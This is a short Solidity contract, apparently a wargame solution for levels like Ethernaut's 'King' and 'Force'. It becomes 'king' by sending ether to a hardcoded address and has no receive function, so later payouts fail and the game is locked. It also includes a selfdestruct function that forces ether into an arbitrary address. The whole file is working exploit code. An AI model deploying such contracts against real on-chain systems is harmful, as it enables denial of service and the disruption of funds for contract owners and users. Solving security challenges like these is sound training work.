// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


// no fallback or receive function so any transfer to this contract will fail
// no need to selfdestruct


contract HackForce {

    address payable king = 0x917D60E04BDd41D6F8Feaa53EEeE10f427d43517;

    function become_king() public payable {
        // king.transfer(msg.value); // got out of gas error
        (bool sent, ) = king.call.value(msg.value)(""); // trigger receive payable
        require(sent, "Failed to send value!");
    }

    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
 }